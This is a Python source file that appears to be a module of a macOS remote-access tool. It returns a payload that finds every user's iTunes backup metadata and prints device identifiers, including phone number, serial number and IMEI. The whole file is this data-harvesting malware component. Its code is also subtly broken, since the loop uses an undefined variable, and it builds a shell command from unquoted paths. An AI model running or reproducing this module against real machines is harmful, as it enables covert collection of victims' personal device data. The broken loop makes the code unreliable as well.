class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Shows a list of devices backed up by iTunes.",
            "References": []
        }

    def setup(self, module_view, output_view, successful):
        successful.put(True)

    def run(self):
        return """\
        from glob import glob
        
        backup_paths = glob("/Users/*/Library/Application Support/MobileSync/Backup/*/Info.plist")
        
        
        def print_plist(key, path):
            print key + ": " + os.popen("/usr/libexec/PlistBuddy -c 'Print : \\"%s\\"' %s" % (key, path)).read()\\
                                        .replace("\\n", "")
        
        
        if len(backup_paths) > 0:
            print MESSAGE_INFO + "Looking for backups..."
        
            for i, path in enumerate(backup_paths):
                print MESSAGE_INFO + "Device: %s" % str(i + 1)
                
                plist_keys = [
                    "Product Name",
                    "Product Version",
                    "Last Backup Date",
                    "Device Name",
                    "Phone Number",
                    "Serial Number",
                    "IMEI",
                    "Target Identifier",
                    "iTunes Version"
                ]
                
                for plist_key in keys:
                    print_plist(plist_key, path)
        else:
            print MESSAGE_INFO + "No local backups found."
        """